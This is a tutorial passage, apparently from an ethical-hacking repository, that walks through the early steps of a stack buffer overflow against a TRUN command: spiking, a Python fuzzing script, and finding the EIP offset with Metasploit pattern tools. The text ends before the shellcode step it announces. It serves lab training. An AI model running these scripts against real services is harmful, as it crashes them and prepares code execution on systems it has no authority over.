## Overview
1. Spiking
2. Fuzzing
3. Finding the Offset
4. Overwriting the EIP
5. Finding bad characters
6. Finding the right module
7. Generating shellcode

# 1. Spiking
Spiking allows us to find the functions/commands within a program that are vulnerable.

First, we attach the process unto our Debugger and then connect to it:

```bash
nc -nv PROCESS PORT
```
![image](https://github.com/0xScorpio/Ethical-Hacking/assets/140411254/9b63dcf6-11cb-4b21-996e-4deb42329361)

In our case, we see multiple functions that we could spike using:
```
generic_send_tcp 0.0.0.0 PORT spike.spk 0 0
```
![image](https://github.com/0xScorpio/Ethical-Hacking/assets/140411254/d2219e12-8268-4dd9-813c-7d9650f7d33f)

# 2. Fuzzing
Now that we know what the vulnerable function/command is, we can now 'fuzz' it in order to find the approximate memory location to where the program crashes.
In our example, the TRUN command/function was found to be vulnerable and thus we want to probe it with a set of simple buffers. 
You might need to modify the script with execution rights:

```python
#!/usr/bin/python3
 
import sys, socket
from time import sleep
 
buffer = "A" * 100
 
while True:
    try:
        payload = "TRUN /.:/" + buffer
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('TARGET-IP',TARGET-PORT))
        print ("[+] Sending the payload...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
```

Once the program crashes, Control+C and check the bytes section.

# 3. Finding the Offset
Build the first section of the offset:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l NUMBEROFBYTES
```
and place the result into the following checker script:
```python
#!/usr/bin/python3

import sys, socket
from time import sleep

offset = "" #offset here

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('TARGET-IP',TARGET-PORT))

	payload = "TRUN /.:/" + offset

	s.send((payload.encode()))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
```

Run the script unto the running application until it crashes again.
![image](https://github.com/0xScorpio/Ethical-Hacking/assets/140411254/c2ce21e4-6006-47b7-9a38-117e1ca18701)

Find the EIP value and place it into the offset builder using the -q flag:
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l NUMBEROFBYTES -q [EIP]
```
![image](https://github.com/0xScorpio/Ethical-Hacking/assets/140411254/67aa6a60-b997-4426-85bf-7c8207405e5c)

